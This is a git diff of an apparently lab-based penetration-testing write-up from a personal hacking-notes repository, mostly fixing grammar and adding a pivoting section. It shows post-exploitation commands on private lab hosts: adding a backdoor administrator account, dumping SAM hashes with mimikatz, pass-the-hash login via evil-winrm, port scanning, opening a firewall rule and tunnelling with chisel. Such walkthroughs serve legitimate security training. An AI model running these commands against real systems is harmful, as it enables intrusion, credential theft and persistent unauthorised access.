@@ -162,7 +162,7 @@ Ncat: Connection from 10.200.96.150:51806.
 PS C:\GitStack\gitphp> whoami
 nt authority\system
 ```
-- For persistence, I add a new user, with memeber of administrators and remote management users group.
+- For persistence, I add a new user, with members of administrators and remote management users group.
 ```powershell
  net user badboy password123 /add
 
@@ -196,11 +196,11 @@ Logon hours allowed          All
 Local Group Memberships      *Administrators       *Remote Management Use
                              *Users
 ```
-- Now I logged in using `xfreerdp` with the new added users credentials.
+- Now I logged in using `xfreerdp` with the newly added user credentials.
 ```bash
  xfreerdp /u:badboy /p:password123 /v:10.200.96.150 +clipboard /drive:/home/singhx/labs,share
 ```
-- By uploading the mimikatz, I dumped sam file and save the administrators hash for future use.
+- By uploading the mimikatz, I dumped the sam file and save the administrator's hash for future use.
 ```powershell
 mimikatz.exe
 privilege::debug
@@ -211,8 +211,35 @@ RID  : 000001f4 (500)
 User : Administrator
   Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1
 ```
-- I got login using `evil-winrm` by passing the hash of user administrator.
+- I got a login using `evil-winrm` by passing the hash of the user administrator.
 ```
 evil-winrm -i 10.200.96.150 -u administrator -H  37db630168e5f82aafa8461e05c6bbd1
 ```
-- Next task is to scan for the network ip 10.200.96.100 for this is use powershell script
+- Next task is to scan for the network ip 10.200.96.100 for this I use the [invoke-portscan.ps1](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/Invoke-Portscan.ps1) powershell script.
+```powershell
+. .\portscan.ps1
+
+Invoke-Portscan -Hosts 10.200.96.100 -TopPorts 50
+
+Hostname      : 10.200.96.100
+alive         : True
+openPorts     : {80, 3389}
+closedPorts   : {}
+filteredPorts : {445, 443, 5900, 993...}
+finishTime    : 8/5/2023 11:49:59 PM
+```
+- Now, we need to make a connection from the target host to the attacking machine. For this, we need to open a port through the firewall.
+```powershell
+netsh advfirewall firewall add rule name="chisel" dir=in action=allow protocol=tcp localport=18000
+```
+- We will set up a server on the target host and a client connection on the attacking machine.
+```powershell
+.\chisel.exe server -p 18000 --socks5        # On Target Host
+
+chisel client 10.200.96.150:18000 1080:socks        # On Attacking machine
+```
+- On navigating to the `http://10.200.96.100` we get the same interface as we get on `http://10.200.96.200`.
+
+![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/598fd07f-f0f0-4590-883e-21819d2ef7ed)
+
+
